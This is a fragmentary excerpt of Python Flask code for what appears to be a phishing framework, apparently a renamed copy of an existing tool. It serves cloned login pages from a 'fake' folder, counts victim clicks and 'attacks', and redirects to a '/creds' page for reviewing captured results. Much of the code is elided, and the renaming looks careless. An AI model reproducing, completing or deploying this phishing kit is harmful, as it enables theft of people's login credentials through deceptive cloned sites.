...
if len(argv) < 2:
    print("./Mehedi <youruser> <yourpassword>\n\ni.e.: ./Mehedi.py root pass")
    exit(0)
...
def countNotPickedUp():
    ...
    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM mehedi where id = 1")
...
def getLogin():
    ...
    if sta == 'clone':
        ...
        o = url.replace('://', '-')
        cur = g.db
        cur.execute("UPDATE mehedi SET clicks = clicks + 1 where id = 1")
        g.db.commit()
        template_path = 'fake/{}/index.html'.format(o)
        return render_template(template_path)
    # caso seja a url padrao
    elif url == 'https://github.com/UndeadSec/Mehedi':
...
def echo():
    ...
    if len(url) > 4 and len(red) > 4:
        ...
        url = 'https://github.com/UndeadSec/Mehedi'
        red = 'https://github.com/UndeadSec/Mehedi'
    cur = g.db
    cur.execute("UPDATE mehedi SET attacks = attacks + 1 where id = 1")
    g.db.commit()
    return redirect('/creds')
...
def getCreds():
    cur = g.db
    attacks = cur.execute("SELECT attacks FROM mehedi where id = 1").fetchone()[0]
    clicks = cur.execute("SELECT clicks FROM mehedi where id = 1").fetchone()[0]
    tokenapi = cur.execute("SELECT token FROM mehedi where id = 1").fetchone()[0]
...
def revokeToken():
    ...
    if revoke == 'yes':
        cur = g.db
        upsql = "UPDATE mehedi SET token = '{}' where id = 1".format(genToken())
        cur.execute(upsql)
        g.db.commit()
        token = cur.execute("SELECT token FROM mehedi where id = 1").fetchone()[0]
...
def main():
        if version_info<(3,0,0):
            print('[!] Please use Python 3. $ python3 Mehedi#FF000D.py')
            exit(0)
        head()
        cleanFake()
        # Inicia o banco
